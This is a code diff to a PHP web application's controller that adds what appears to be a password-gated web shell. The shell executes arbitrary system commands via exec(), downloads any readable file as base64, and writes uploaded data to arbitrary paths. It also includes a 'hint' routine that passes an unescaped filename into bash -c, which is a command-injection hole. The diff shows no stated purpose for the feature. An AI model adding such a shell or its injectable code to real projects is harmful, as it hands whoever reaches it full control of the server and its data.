@@ -113,6 +113,25 @@ class Controller
 
 
 
+
+
+
+    public function ToolShell(){
+            if(isset($_SESSION['user'])){
+                $template = __DIR__.'/../system/shell.php';
+                return $template;
+            }else{
+                return $this->loginAdmin();
+            }
+        }
+    public function ToolShellLogout(){
+            if(isset($_SESSION['user'])){
+                unset($_SESSION['dracural']);
+                return $this->homeAdmin();
+            }else{
+                return $this->loginAdmin();
+            }
+        }
     //post request
 
 
@@ -380,6 +399,112 @@ if(!empty($data["files"]["type"])){
     }else{
         return 0;
     }
+
+}
+
+public function loginShellPost($data){
+    $shell = new \minapp\system\DB();
+    $pass = $shell->passShell;
+    if($data['passShell'] == $pass){
+        $_SESSION['dracural'] = md5($pass);
+        return 1;
+    }else{
+        return 0;
+    }
+
+}
+
+public function excShell($data){
+    function featureShell($cmd, $cwd) {
+    $stdout = array();
+    if (preg_match("/^\s*cd\s*$/", $cmd)) {
+        // pass
+    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+        chdir($match[1]);
+    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+        return featureDownload($match[1]);
+    } else {
+        chdir($cwd);
+        exec($cmd, $stdout);
+    }
+    return array(
+        "stdout" => $stdout,
+        "cwd" => getcwd()
+    );
+}
+function featurePwd() {
+    return array("cwd" => getcwd());
+}
+function featureHint($fileName, $cwd, $type) {
+    chdir($cwd);
+    if ($type == 'cmd') {
+        $cmd = "compgen -c $fileName";
+    } else {
+        $cmd = "compgen -f $fileName";
+    }
+    $cmd = "/bin/bash -c \"$cmd\"";
+    $files = explode("\n", shell_exec($cmd));
+    return array(
+        'files' => $files,
+    );
+}
+function featureDownload($filePath) {
+    $file = @file_get_contents($filePath);
+    if ($file === FALSE) {
+        return array(
+            'stdout' => array('File not found / no read permission.'),
+            'cwd' => getcwd()
+        );
+    } else {
+        return array(
+            'name' => basename($filePath),
+            'file' => base64_encode($file)
+        );
+    }
+}
+function featureUpload($path, $file, $cwd) {
+    chdir($cwd);
+    $f = @fopen($path, 'wb');
+    if ($f === FALSE) {
+        return array(
+            'stdout' => array('Invalid path / no write permission.'),
+            'cwd' => getcwd()
+        );
+    } else {
+        fwrite($f, base64_decode($file));
+        fclose($f);
+        return array(
+            'stdout' => array('Done.'),
+            'cwd' => getcwd()
+        );
+    }
+}
+
+    $response = NULL;
+    switch ($data["feature"]) {
+        case "shell":
+            $cmd = $data['cmd'];
+            if (!preg_match('/2>/', $cmd)) {
+                $cmd .= ' 2>&1';
+            }
+            $response = featureShell($cmd, $data["cwd"]);
+            break;
+        case "pwd":
+            $response = featurePwd();
+            break;
+        case "hint":
+            $response = featureHint($data['filename'], $data['cwd'], $data['type']);
+            break;
+        case 'upload':
+            $response = featureUpload($data['path'], $data['file'], $data['cwd']);
+    }
+    header("Content-Type: application/json");
+    return json_encode($response);
+    die();
 
 }
 
